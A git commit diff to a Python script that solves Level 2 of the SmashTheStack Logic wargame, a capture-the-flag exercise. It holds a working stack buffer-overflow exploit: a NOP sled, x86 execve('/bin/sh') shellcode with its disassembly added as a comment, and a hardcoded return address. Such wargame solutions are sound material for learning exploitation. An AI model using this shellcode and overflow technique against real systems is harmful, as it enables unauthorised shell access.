cd64ff85fc39579baeff20b7f3736b59041249bf
Adam Ziaja <adamziaja@users.noreply.github.com>
2014-04-04 10:31:27 +0200

    Level 2, Logic Wargame, SmashTheStack

--- smashthestack/level2.py
+++ smashthestack/level2.py
@@ -6,6 +6,8 @@
 '''
 Level 2, Logic Wargame, SmashTheStack
 
+buffer overflow
+
 $ id
 uid=604(level2) gid=604(level2) groups=604(level2),615(nosu)
 $ python level2.py
@@ -18,6 +20,19 @@ import os
 level2 = 'fsckmelogic '
 nop = '\x90'
 shellcode = '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
+'''
+xor     eax, eax
+push    eax
+push    68732F2Fh
+push    6E69622Fh
+mov     ebx, esp
+push    eax
+push    ebx
+mov     ecx, esp
+cdq
+mov     al, 0Bh
+int     80h	; LINUX - sys_execve
+'''
 ret = '\xc4\xd9\xff\xbf'
 payload = level2 + nop * 4084 + shellcode + ret
 
